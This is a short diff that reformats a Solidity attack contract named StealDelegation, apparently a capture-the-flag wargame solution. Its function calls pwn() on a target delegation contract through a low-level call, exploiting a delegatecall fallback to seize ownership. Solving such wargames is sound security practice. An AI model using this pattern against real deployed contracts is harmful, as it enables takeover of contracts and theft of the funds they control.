@@ -11,8 +11,8 @@ contract StealDelegation {
         delegation = _delegation;
     }
 
-    function stealDelegation() public returns(bool) {
-        (bool success, ) = delegation.call(abi.encodeWithSignature("pwn()"));
+    function stealDelegation() public returns (bool) {
+        (bool success,) = delegation.call(abi.encodeWithSignature("pwn()"));
         return success;
     }
 }
